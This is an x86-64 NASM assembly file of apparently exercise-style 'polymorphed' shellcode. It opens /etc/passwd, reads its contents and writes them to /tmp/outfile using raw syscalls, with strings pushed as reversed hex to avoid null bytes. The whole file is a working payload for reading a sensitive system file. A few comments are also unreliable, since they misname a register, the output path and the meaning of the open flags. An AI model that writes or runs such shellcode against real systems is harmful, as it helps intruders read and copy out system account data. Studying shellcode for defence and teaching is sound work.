; File: readPwOutputFile.nasm
; Author: 
; Purpose: polymorphed shellcode for reading /etc/passwd file and output to /tmp/outfile

; syscall needed: 
; 		open	2	open(const char *path, int oflag)
; 		read	0	read(int fildes, void *buf, size_t nbyte)
; 		write 	1	write(int fildes, const void *buf, size_t nbyte)

; registers needed: 
; 		rax	syscall
; 		rdi	first arg
; 		rsi	second arg
;		rdx	third arg



global _start

section .text
_start:
	; 
	; open(address of '/etc/passwd', O_RDONLY) 
	; syscall 2
	xor rbx, rbx				; /etc/passwd string address setup
	push rbx				; push NULL 
	mov rbx, 0x64777373
	push rbx
	mov rbx, 0x61702f2f6374652f
	push rbx 				; push /etc//passwd in reverse hex
	
	xor rax, rax				; syscall setup
	mov al, 2				; syscall #2
	mov rdi, rsp				; *open first argument*
	xor rsi, rsi				; *open second argument*
	syscall

	xor rdi, rdi				; read syscall fd setup
	mov rdi, rax				; file descriptor returned for /etc/passwd moved to rbx
						; *read first argument*
	
	;
	; read(/etc/passwd_fd, *buffer, nbyte)
	; syscall 0
	xor rdx, rdx
	mov rsi, rsp				; *read second argument*	
	mov dx, 0xFFFF				; size_t is usually masked as int, which is two byte const
	xor rax, rax
	syscall	

	xor r8, r8				; write syscall bytes to write setup
	mov r8, rax
	mov r9, rsp				; read buffer for write syscall buffer setup


	;
	; open(address of /tmp/fileout, O_CREA+O_RDWR)
	; syscall 2
	xor rbx, rbx				; address of /tmp/outfile string setup
	push rbx				; push NULL
	mov rbx, 0x656c6966
	push rbx
	mov rbx, 0x74756f2f706d742f
	push rbx				; push /tmp/outfile in reverse hex
	mov rdi, rsp				; *open first argument*

	xor rsi, rsi				; *open second argument*
	mov si, 0x66				; 0x66 = 102 = 100 (create) + 2 (read and write)
	
	xor rax, rax				; open syscall setup
	mov al, 2
	syscall

	xor rdi, rdi				; *write first argument*
	mov rdi, rax				; /tmp/fileout fd setup

	;
	; write(/tmp/fileout fd, buffer saved from /etc/passwd read, bytes read from /etc/passwd)
	; syscall 1
	mov rsi, r9
	xor rdx, rdx
	mov rdx, r8
	mov al, 1				; write syscall setup
	syscall

	;
	; exit(exit status)
	; syscall 60
	xor rax, rax				; exit syscall setup
	mov al, 60
	xor rdi, rdi				; *exit first argument*
	syscall


